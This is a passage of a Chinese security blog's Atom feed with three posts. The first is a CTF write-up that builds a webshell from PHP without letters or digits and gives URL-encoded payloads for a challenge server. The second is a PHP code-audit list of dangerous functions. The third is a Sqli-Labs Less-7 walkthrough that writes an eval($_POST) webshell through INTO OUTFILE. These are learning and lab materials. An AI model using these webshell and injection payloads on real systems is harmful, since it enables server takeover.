class="line">&lt;/pre&gt;</div></pre></td></tr></table></figure>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;考点：反序列化，rand，sql注入&lt;br&gt;
    
    </summary>
    
      <category term="Web安全" scheme="http://yoursite.com/categories/Web%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="CTF" scheme="http://yoursite.com/tags/CTF/"/>
    
      <category term="writeup" scheme="http://yoursite.com/tags/writeup/"/>
    
      <category term="web" scheme="http://yoursite.com/tags/web/"/>
    
  </entry>
  
  <entry>
    <title>谈一谈php变量的内存分布</title>
    <link href="http://yoursite.com/2017/07/16/%E8%B0%88%E4%B8%80%E8%B0%88php%E5%8F%98%E9%87%8F%E7%9A%84%E5%86%85%E5%AD%98%E5%88%86%E5%B8%83/"/>
    <id>http://yoursite.com/2017/07/16/谈一谈php变量的内存分布/</id>
    <published>2017-07-15T17:02:45.000Z</published>
    <updated>2017-07-15T17:02:45.786Z</updated>
    
    <summary type="html">
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>一道好玩的webshell题</title>
    <link href="http://yoursite.com/2017/07/15/%E4%B8%80%E9%81%93%E5%A5%BD%E7%8E%A9%E7%9A%84webshell%E9%A2%98/"/>
    <id>http://yoursite.com/2017/07/15/一道好玩的webshell题/</id>
    <published>2017-07-15T12:38:28.000Z</published>
    <updated>2017-07-15T15:56:06.109Z</updated>
    
    <content type="html"><![CDATA[<p>过滤了数字和绝大多数字符。<br><a id="more"></a><br>题目给了源码：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line">ini_set(<span class="string">"display_errors"</span>, <span class="string">"On"</span>);</div><div class="line">error_reporting(E_ALL | E_STRICT);</div><div class="line"></div><div class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>($_GET[<span class="string">'c'</span>]))&#123;</div><div class="line">   show_source(<span class="keyword">__FILE__</span>);</div><div class="line">   <span class="keyword">die</span>();</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">rand_string</span><span class="params">( $length )</span> </span>&#123;</div><div class="line">   $chars = <span class="string">"abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"</span>;    </div><div class="line">   $size = strlen( $chars );</div><div class="line">   $str = <span class="string">''</span>;</div><div class="line">   <span class="keyword">for</span>( $i = <span class="number">0</span>; $i &lt; $length; $id+ ) &#123;</div><div class="line">	   $str .= $chars[ rand( <span class="number">0</span>, $size - <span class="number">1</span> ) ];</div><div class="line">   &#125;</div><div class="line">   <span class="keyword">return</span> $str;</div><div class="line">&#125;</div><div class="line"></div><div class="line">$data = $_GET[<span class="string">'c'</span>];</div><div class="line"></div><div class="line">$black_list = <span class="keyword">array</span>(<span class="string">' '</span>, <span class="string">'!'</span>, <span class="string">'"'</span>, <span class="string">'#'</span>, <span class="string">'%'</span>, <span class="string">'&amp;'</span>, <span class="string">'*'</span>, <span class="string">','</span>, <span class="string">'-'</span>, <span class="string">'/'</span>, <span class="string">'0'</span>, <span class="string">'1'</span>, <span class="string">'2'</span>, <span class="string">'3'</span>, <span class="string">'4'</span>, <span class="string">'5'</span>, <span class="string">'6'</span>, <span class="string">'7'</span>, <span class="string">'8'</span>, <span class="string">'9'</span>, <span class="string">':'</span>, <span class="string">'&lt;'</span>, <span class="string">'&gt;'</span>, <span class="string">'?'</span>, <span class="string">'@'</span>, <span class="string">'A'</span>, <span class="string">'B'</span>, <span class="string">'C'</span>, <span class="string">'D'</span>, <span class="string">'E'</span>, <span class="string">'F'</span>, <span class="string">'G'</span>, <span class="string">'H'</span>, <span class="string">'I'</span>, <span class="string">'J'</span>, <span class="string">'K'</span>, <span class="string">'L'</span>, <span class="string">'M'</span>, <span class="string">'N'</span>, <span class="string">'O'</span>, <span class="string">'P'</span>, <span class="string">'Q'</span>, <span class="string">'R'</span>, <span class="string">'S'</span>, <span class="string">'T'</span>, <span class="string">'U'</span>, <span class="string">'V'</span>, <span class="string">'W'</span>, <span class="string">'X'</span>, <span class="string">'Y'</span>, <span class="string">'Z'</span>, <span class="string">'\\'</span>, <span class="string">'^'</span>, <span class="string">'`'</span>, <span class="string">'a'</span>, <span class="string">'b'</span>, <span class="string">'c'</span>, <span class="string">'d'</span>, <span class="string">'e'</span>, <span class="string">'f'</span>, <span class="string">'g'</span>, <span class="string">'h'</span>, <span class="string">'i'</span>, <span class="string">'j'</span>, <span class="string">'k'</span>, <span class="string">'l'</span>, <span class="string">'m'</span>, <span class="string">'n'</span>, <span class="string">'o'</span>, <span class="string">'p'</span>, <span class="string">'q'</span>, <span class="string">'r'</span>, <span class="string">'s'</span>, <span class="string">'t'</span>, <span class="string">'u'</span>, <span class="string">'v'</span>, <span class="string">'w'</span>, <span class="string">'x'</span>, <span class="string">'y'</span>, <span class="string">'z'</span>, <span class="string">'|'</span>, <span class="string">'~'</span>);</div><div class="line"><span class="keyword">foreach</span> ($black_list <span class="keyword">as</span> $b) &#123;</div><div class="line">   <span class="keyword">if</span> (stripos($data, $b) !== <span class="keyword">false</span>)&#123;</div><div class="line">	   <span class="keyword">die</span>(<span class="string">"WAF!"</span>);</div><div class="line">   &#125;</div><div class="line">&#125;</div><div class="line">$filename=rand_string(<span class="number">0x20</span>).<span class="string">'.php'</span>;</div><div class="line"></div><div class="line">$folder=<span class="string">'uploads/'</span>;</div><div class="line"></div><div class="line">$full_filename = $folder.$filename;</div><div class="line"></div><div class="line"><span class="keyword">if</span>(file_put_contents($full_filename, <span class="string">'&lt;?php '</span>.$data))&#123;</div><div class="line">   <span class="keyword">echo</span> <span class="string">"&lt;a href='"</span>.$full_filename.<span class="string">"'&gt;WebShell&lt;/a&gt;&lt;/br&gt;"</span>;</div><div class="line">   <span class="keyword">echo</span> <span class="string">"Enjoy your webshell~"</span>;</div><div class="line">&#125;<span class="keyword">else</span>&#123;</div><div class="line">   <span class="keyword">echo</span> <span class="string">"Some thing wrong..."</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>字母啥的都过略了。参考p神的<a href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html#_4" target="_blank" rel="external">一些不包含数字和字母的webshell</a>。其思路就是利用字符串<code>ARRAY</code>获取字符<code>A</code>，利用php的特性，从<code>A</code>递增获得<code>A</code>到<code>Z</code>的各个字母。原webshell存在<code>&quot;</code>修改其webshell，如下：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line"></div><div class="line">$_=<span class="string">''</span>;$_[+$_]++;</div><div class="line">$_=$_.<span class="string">''</span>;</div><div class="line">$__=$_[+<span class="string">''</span>];</div><div class="line">$_ = $__;</div><div class="line">$___=$_;</div><div class="line">$__=$_;</div><div class="line">$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;</div><div class="line">$___.=$__;</div><div class="line">$___.=$__;</div><div class="line">$__=$_;</div><div class="line">$__++;$__++;$__++;$__++;  </div><div class="line">$___.=$__;</div><div class="line">$__=$_;</div><div class="line">$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;</div><div class="line">$___.=$__;</div><div class="line">$__=$_;</div><div class="line">$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;</div><div class="line">$___.=$__;</div><div class="line">$____=<span class="string">'_'</span>;</div><div class="line">$__=$_;</div><div class="line">$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;</div><div class="line">$____.=$__;</div><div class="line">$__=$_;</div><div class="line">$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;</div><div class="line">$____.=$__;</div><div class="line">$__=$_;</div><div class="line">$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;</div><div class="line">$____.=$__;</div><div class="line">$__=$_;</div><div class="line">$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;</div><div class="line">$____.=$__;</div><div class="line">$_=$$____;</div><div class="line">$___($_[_]);</div></pre></td></tr></table></figure></p>
<p>由于<code>+</code>在传送中会被解释为空格，所以需要提前url编码为<code>%2b</code>,然后还需要去掉上面的这个webshell中的空格，换行。最后的payload如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://120.24.215.80:10010/?c=$_=&apos;&apos;;$_[%2b$_]%2b%2b;$_=$_.&apos;&apos;;$__=$_[%2b&apos;&apos;];$_=$__;$___=$_;$__=$_;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$___.=$__;$___.=$__;$__=$_;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$___.=$__;$__=$_;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$___.=$__;$__=$_;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$___.=$__;$____=&apos;_&apos;;$__=$_;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$____.=$__;$__=$_;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$____.=$__;$__=$_;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$____.=$__;$__=$_;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$____.=$__;$_=$$____;$___($_[_]);</div></pre></td></tr></table></figure></p>
<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170715/1.jpg?raw=true" alt=""></p>
<p>这里另外补充一个webshell，解法来自<a href="http://www.jianshu.com/p/d23d4b1358f2" target="_blank" rel="external">http://www.jianshu.com/p/d23d4b1358f2</a>：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line">$_=[].[];</div><div class="line">$__=<span class="string">''</span>;</div><div class="line">$_=$_[<span class="string">''</span>];</div><div class="line">$_=++$_;</div><div class="line">$_=++$_;</div><div class="line">$_=++$_;</div><div class="line">$_=++$_;</div><div class="line">$__.=$_; <span class="comment">// E</span></div><div class="line">$_=++$_;</div><div class="line">$_=++$_;</div><div class="line">$__=$_.$__; <span class="comment">// GE</span></div><div class="line">$_=++$_;</div><div class="line">$_=++$_;</div><div class="line">$_=++$_;</div><div class="line">$_=++$_;</div><div class="line">$_=++$_;</div><div class="line">$_=++$_;</div><div class="line">$_=++$_;</div><div class="line">$_=++$_;</div><div class="line">$_=++$_;</div><div class="line">$_=++$_;</div><div class="line">$_=++$_;</div><div class="line">$_=++$_;</div><div class="line">$_=++$_;</div><div class="line">$__.=$_; <span class="comment">// GET var_dump($&#123;'_'.$__&#125;[_]($&#123;'_'.$__&#125;[__])); // $_GET["_"]($_GET["__"]);</span></div></pre></td></tr></table></figure></p>
<p>其最后的payload为：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://120.24.215.80:10010/?c=%24_%3d%5b%5d.%5b%5d%3b%24__%3d%27%27%3b%24_%3d%24_%5b%27%27%5d%3b%24_%3d%2b%2b%24_%3b%24_%3d%2b%2b%24_%3b%24_%3d%2b%2b%24_%3b%24_%3d%2b%2b%24_%3b%24__.%3d%24_%3b%24_%3d%2b%2b%24_%3b%24_%3d%2b%2b%24_%3b%24__%3d%24_.%24__%3b%24_%3d%2b%2b%24_%3b%24_%3d%2b%2b%24_%3b%24_%3d%2b%2b%24_%3b%24_%3d%2b%2b%24_%3b%24_%3d%2b%2b%24_%3b%24_%3d%2b%2b%24_%3b%24_%3d%2b%2b%24_%3b%24_%3d%2b%2b%24_%3b%24_%3d%2b%2b%24_%3b%24_%3d%2b%2b%24_%3b%24_%3d%2b%2b%24_%3b%24_%3d%2b%2b%24_%3b%24_%3d%2b%2b%24_%3b%24__.%3d%24_%3b%24%7b%27_%27.%24__%7d%5b_%5d(%24%7b%27_%27.%24__%7d%5b__%5d)%3b</div></pre></td></tr></table></figure></p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;过滤了数字和绝大多数字符。&lt;br&gt;
    
    </summary>
    
      <category term="Web安全" scheme="http://yoursite.com/categories/Web%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="CTF" scheme="http://yoursite.com/tags/CTF/"/>
    
      <category term="writeup" scheme="http://yoursite.com/tags/writeup/"/>
    
      <category term="web" scheme="http://yoursite.com/tags/web/"/>
    
      <category term="webshell" scheme="http://yoursite.com/tags/webshell/"/>
    
  </entry>
  
  <entry>
    <title>php代码审计小总结</title>
    <link href="http://yoursite.com/2017/07/14/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%B0%8F%E6%80%BB%E7%BB%93/"/>
    <id>http://yoursite.com/2017/07/14/php代码审计小总结/</id>
    <published>2017-07-14T14:00:50.000Z</published>
    <updated>2017-07-14T14:26:19.987Z</updated>
    
    <content type="html"><![CDATA[<p>php代码审计小总结<br><a id="more"></a></p>
<h1 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h1><h2 id="php代码执行"><a href="#php代码执行" class="headerlink" title="php代码执行"></a>php代码执行</h2><ul>
<li>eval()</li>
<li>assert()</li>
<li>preg_replace + ‘/e’</li>
<li>call_user_func()</li>
<li>call_user_func_arra()</li>
<li>create_function</li>
<li>array_map()</li>
</ul>
<h2 id="系统命令执行"><a href="#系统命令执行" class="headerlink" title="系统命令执行"></a>系统命令执行</h2><ul>
<li>system()</li>
<li>passthru()</li>
<li>exec()</li>
<li>pcntl_exec()</li>
<li>shell_exec()</li>
<li>popen()</li>
<li>proc_open()</li>
<li>`(反单引号)</li>
<li>ob_start()</li>
<li>escapeshellcmd() // 该函数用于过滤</li>
</ul>
<h1 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h1><ul>
<li>move_uploaded_file()</li>
<li>getimagesize() //验证文件头只要为GIF89a，就会返回真</li>
</ul>
<h1 id="文件删除"><a href="#文件删除" class="headerlink" title="文件删除"></a>文件删除</h1><ul>
<li>unlink()</li>
<li>session_destroy()</li>
</ul>
<h1 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h1><h2 id="本地文件包含"><a href="#本地文件包含" class="headerlink" title="本地文件包含"></a>本地文件包含</h2><ul>
<li>require()</li>
<li>include()</li>
<li>include_once()</li>
<li>require_once()</li>
</ul>
<h2 id="远程文件包含"><a href="#远程文件包含" class="headerlink" title="远程文件包含"></a>远程文件包含</h2><ul>
<li>allow_url_include = on</li>
</ul>
<h1 id="文件读取"><a href="#文件读取" class="headerlink" title="文件读取"></a>文件读取</h1><h2 id="读文件"><a href="#读文件" class="headerlink" title="读文件"></a>读文件</h2><ul>
<li>hightlight_file($filename);</li>
<li>show_source($filename);</li>
<li>print_r(php_strip_whitespace($filename));</li>
<li>print_r(file_get_contents($filename));</li>
<li>readfile($filename);</li>
<li>print_r(file($filename)); // var_dump</li>
<li>fread(fopen($filename,”r”), $size);</li>
<li>include($filename); // 非php代码</li>
<li>include_once($filename); // 非php代码</li>
<li>require($filename); // 非php代码</li>
<li>require_once($filename); // 非php代码</li>
<li>print_r(fread(popen(“cat flag”, “r”), $size));</li>
<li>print_r(fgets(fopen($filename, “r”))); // 读取一行</li>
<li>fpassthru(fopen($filename, “r”)); // 从当前位置一直读取到 EOF</li>
<li>print_r(fgetcsv(fopen($filename,”r”), $size));</li>
<li>print_r(fgetss(fopen($filename, “r”))); // 从文件指针中读取一行并过滤掉 HTML 标记</li>
<li>print_r(fscanf(fopen(“flag”, “r”),”%s”));</li>
<li>print_r(parse_ini_file($filename)); // 失败时返回 false , 成功返回配置数组</li>
</ul>
<h2 id="列目录"><a href="#列目录" class="headerlink" title="列目录"></a>列目录</h2><ul>
<li>print_r(glob(“*”)); // 列当前目录</li>
<li>print_r(glob(“/*”)); // 列根目录 print_r(scandir(“.”));</li>
<li>print_r(scandir(“/“));</li>
<li><code>$d=opendir(&quot;.&quot;);while(false!==($f=readdir($d))){echo&quot;$f\n&quot;;}</code></li>
<li><code>$d=dir(&quot;.&quot;);while(false!==($f=$d-&gt;read())){echo$f.&quot;\n&quot;;}</code></li>
</ul>
<h2 id="超全局变量"><a href="#超全局变量" class="headerlink" title="超全局变量"></a>超全局变量</h2><ul>
<li><a href="http://php.net/manual/zh/language.variables.superglobals.php" target="_blank" rel="external">$GLOBALS</a></li>
</ul>
<h1 id="变量覆盖"><a href="#变量覆盖" class="headerlink" title="变量覆盖"></a>变量覆盖</h1><ul>
<li>extract()</li>
<li>import_request_variables()</li>
<li>parse_str()</li>
<li>mb_parse_str()</li>
<li>全局变量覆盖：register_globals为ON，$GLOBALS</li>
</ul>
<h1 id="php序列化函数"><a href="#php序列化函数" class="headerlink" title="php序列化函数"></a>php序列化函数</h1><ul>
<li>serialize()</li>
<li>unserialize()</li>
<li>ini_set(‘session.serialize_handler’, ‘php_serialize’);</li>
</ul>
<h1 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h1><ul>
<li><a href="http://blog.neargle.com/SecNewsBak/drops/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%85%A5%E9%97%A8%E6%80%BB%E7%BB%93.html" target="_blank" rel="external">代码审计入门总结</a></li>
<li><a href="http://www.jianshu.com/p/33bc37ef72cc" target="_blank" rel="external">php花式读取文件函数汇总</a></li>
<li><a href="https://book.ph0en1x.com/web/phpdai-ma-shen-ji-xiao-zong-jie.html" target="_blank" rel="external">Awesome-CTF-Book</a></li>
</ul>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;php代码审计小总结&lt;br&gt;
    
    </summary>
    
      <category term="Web安全" scheme="http://yoursite.com/categories/Web%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="代码审计" scheme="http://yoursite.com/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
      <category term="php" scheme="http://yoursite.com/tags/php/"/>
    
  </entry>
  
  <entry>
    <title>Sqli-Labs:Less7-writeup</title>
    <link href="http://yoursite.com/2017/07/12/Sqli-Labs-Less7-writeup/"/>
    <id>http://yoursite.com/2017/07/12/Sqli-Labs-Less7-writeup/</id>
    <published>2017-07-12T01:52:18.000Z</published>
    <updated>2017-07-12T12:22:11.421Z</updated>
    
    <content type="html"><![CDATA[<p>Sqli-Labs是用来练习sql注入的好平台。project地址：<a href="https://github.com/Audi-1/sqli-labs" target="_blank" rel="external">https://github.com/Audi-1/sqli-labs</a><br>本文测试环境：使用phpstudy集成环境。mysql版本：5.5.53</p>
<p>Less7 是 dump out file<br><a id="more"></a></p>
<h1 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h1><p>利用sql注入可以导入导出文件，获取文件内容，或向文件写入内容。</p>
<h2 id="load-file"><a href="#load-file" class="headerlink" title="load_file()"></a>load_file()</h2><p>用于读取本地文件内容。有几个条件限制：</p>
<ul>
<li>需要有读取文件的权限</li>
<li>需要知道文件的绝对物理路径。</li>
</ul>
<p>假设C盘里有一个TEST.txt文件，内容为chybeta。几种读取方式如下：</p>
<h3 id="直接使用绝对路径"><a href="#直接使用绝对路径" class="headerlink" title="直接使用绝对路径"></a>直接使用绝对路径</h3><p>注意对路径中斜杠的处理。</p>
<ul>
<li>mysql&gt; select load_file(“C://TEST.txt”);</li>
<li>mysql&gt; select load_file(“C:/TEST.txt”);</li>
<li>mysql&gt; select load_file(“C:\TEST.txt”);</li>
</ul>
<p>以上返回结果如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">+---------------------------+</div><div class="line">| load_file(&quot;C://TEST.txt&quot;) |</div><div class="line">+---------------------------+</div><div class="line">| chybeta                   |</div><div class="line">+---------------------------+</div><div class="line">1 row in set (0.00 sec)</div></pre></td></tr></table></figure></p>
<p>但若输入以下查询则会返回空即不成功。</p>
<p>mysql&gt; select load_file(“C:\TEST.txt”);<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">+--------------------------+</div><div class="line">| load_file(&quot;C:\TEST.txt&quot;) |</div><div class="line">+--------------------------+</div><div class="line">| NULL                     |</div><div class="line">+--------------------------+</div><div class="line">1 row in set (0.00 sec)</div></pre></td></tr></table></figure></p>
<h3 id="使用编码"><a href="#使用编码" class="headerlink" title="使用编码"></a>使用编码</h3><h4 id="ASCII"><a href="#ASCII" class="headerlink" title="ASCII"></a>ASCII</h4><p>以<code>C:\\TEST.txt</code>为例。对其进行ascii编码后利用char（）进行查询：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">mysql&gt; select load_file(char(67,58,92,92,84,69,83,84,46,116,120,116));</div></pre></td></tr></table></figure></p>
<p>返回结果：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">+---------------------------------------------------------+</div><div class="line">| load_file(char(67,58,92,92,84,69,83,84,46,116,120,116)) |</div><div class="line">+---------------------------------------------------------+</div><div class="line">| chybeta                                                 |</div><div class="line">+---------------------------------------------------------+</div><div class="line">1 row in set (0.02 sec)</div></pre></td></tr></table></figure></p>
<h4 id="十六进制"><a href="#十六进制" class="headerlink" title="十六进制"></a>十六进制</h4><p>以<code>C:\\TEST.txt</code>为例。对其进行十六进制编码后进行查询：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">mysql&gt; select load_file(0x433a5c5c544553542e747874);</div></pre></td></tr></table></figure></p>
<p>返回结果：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">+---------------------------------------+</div><div class="line">| load_file(0x433a5c5c544553542e747874) |</div><div class="line">+---------------------------------------+</div><div class="line">| chybeta                               |</div><div class="line">+---------------------------------------+</div><div class="line">1 row in set (0.00 sec)</div></pre></td></tr></table></figure></p>
<h2 id="select"><a href="#select" class="headerlink" title="select"></a>select</h2><p>可以用来导出文件/数据到文件中。语法如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">SELECT * INTO OUTFILE &apos;file_name&apos;</div></pre></td></tr></table></figure></p>
<p>或者<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">SELECT * INTO DUMPFILE &apos;file_name&apos;</div></pre></td></tr></table></figure></p>
<p>file_name处一般要指定绝对路径，否则就会导出到mysql的目录下。同时对需导出的目录有可写权限。对file_name，可以有以下几种编码方式，注意对路径分隔符的处理：</p>
<h3 id="数据导出"><a href="#数据导出" class="headerlink" title="数据导出"></a>数据导出</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">mysql&gt; select database() into outfile &apos;C:\\phpstudy\\WWW\\test\\1&apos;;</div><div class="line">Query OK, 1 row affected (0.09 sec)</div></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">mysql&gt; select database() into outfile &apos;C:/phpstudy/WWW/test/1&apos;;</div><div class="line">Query OK, 1 row affected (0.00 sec)</div></pre></td></tr></table></figure>
<p>这里是假设写入到文件1中。在实际测试中，要outfile出的文件不能已经存在，否则会报错。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">mysql&gt; select database() into outfile &apos;C:/phpstudy/WWW/test/1&apos;;</div><div class="line">ERROR 1086 (HY000): File &apos;C:/phpstudy/WWW/test/1&apos; already exists</div></pre></td></tr></table></figure></p>
<h3 id="写入webshell"><a href="#写入webshell" class="headerlink" title="写入webshell"></a>写入webshell</h3><p>outfile还可以用来写入webshell。前提是：</p>
<ul>
<li>需要知道网站的绝对物理路径，这样导出后的webshell可访问</li>
<li>对需导出的目录有可写权限。</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">mysql&gt; select &quot;&lt;?php eval($_POST[&apos;chybeta&apos;])?&gt;&quot; into outfile &apos;C:/phpstudy/WWW/test/webshell.php&apos;;</div><div class="line">Query OK, 1 row affected (0.00 sec)</div></pre></td></tr></table></figure>
<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170712/1.jpg?raw=true" alt=""></p>
<h1 id="Lees-7"><a href="#Lees-7" class="headerlink" title="Lees 7"></a>Lees 7</h1><p>payload:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://localhost:20000/sqllab/Less-7/?id=1&apos;)) union select 1,2,&apos;&lt;?php eval($_POST[&quot;chybeta&quot;]) ?&gt;&apos; into outfile &quot;C:\\phpstudy\\WWW\\test\\less7.php&quot; %23</div></pre></td></tr></table></figure></p>
<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170712/2.jpg?raw=true" alt=""></p>
]]></content>
    
    <summary type="html">
    
